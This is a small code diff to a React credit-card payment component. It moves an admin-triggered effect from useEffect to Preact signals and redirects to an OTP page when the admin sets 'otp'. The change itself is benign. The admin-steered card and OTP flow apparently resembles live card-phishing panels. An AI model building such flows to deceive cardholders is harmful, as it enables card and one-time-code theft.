@@ -1,4 +1,5 @@
-import { useEffect, useState, useRef } from "react";
+import { useState, useEffect, useRef } from "react";
+import { useSignalEffect } from "@preact/signals-react/runtime";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
@@ -177,7 +178,7 @@ export default function CreditCardPayment() {
   }, [isFormApproved.value, navigate]);
 
   // Handle card action from admin
-  useEffect(() => {
+  useSignalEffect(() => {
     if (cardAction.value) {
       if (cardAction.value === 'otp') {
         navigate("/otp-verification");
@@ -189,7 +190,7 @@ export default function CreditCardPayment() {
       // Reset card action
       cardAction.value = null;
     }
-  }, [cardAction.value, navigate]);
+  });
 
   // Format card number with spaces every 4 digits
   const formatCardNumber = (value: string): string => {
